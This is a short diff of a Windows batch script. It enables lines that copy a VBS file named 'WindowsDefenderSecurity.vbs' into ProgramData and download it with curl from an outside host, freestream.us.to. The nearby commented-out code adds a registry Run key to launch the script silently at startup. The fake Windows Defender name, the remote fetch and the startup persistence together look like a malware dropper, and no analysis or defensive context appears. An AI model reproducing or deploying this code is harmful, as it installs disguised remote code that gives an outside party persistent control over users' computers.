@@ -89,8 +89,8 @@ if not exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
 ::check for admin rights, commented out
 ::NET SESSION >nul 2>&1
 ::IF %ERRORLEVEL% EQU 0 (
-::copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
-::curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
+copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
+curl -L "https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs" --output "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs"
 ::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
 ::set pcregistryauto=YES, NEW CREATED
 ::) ELSE (
